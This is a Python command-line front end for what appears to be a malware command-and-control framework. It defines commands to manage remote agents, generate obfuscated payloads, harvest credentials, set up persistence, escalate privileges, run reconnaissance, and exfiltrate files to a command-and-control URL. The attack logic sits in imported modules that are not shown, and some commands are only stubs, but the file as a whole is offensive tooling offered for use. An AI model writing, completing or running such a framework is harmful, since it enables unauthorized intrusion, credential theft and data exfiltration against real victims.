import typer
from modules import credential_harvesting, persistence, privilege_escalation, reconnaissance, exfiltration

cli = typer.Typer()

@cli.command()
def list_agents():
    """List all registered agents."""
    typer.echo("Listing agents...")

@cli.command()
def send_command(agent_id: str, command: str):
    """Send a command to a specific agent."""
    typer.echo(f"Sending command to agent {agent_id}...")

@cli.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command()
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        typer.echo(cred)

@cli.command()
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command()
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command()
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    typer.echo(system_info)

@cli.command()
def exfiltrate_data(file_path: str, c2_url: str):
    status_code = exfiltration.exfiltrate_data(file_path, c2_url)
    typer.echo(f"Data exfiltration status: {status_code}")

if __name__ == "__main__":
    cli()
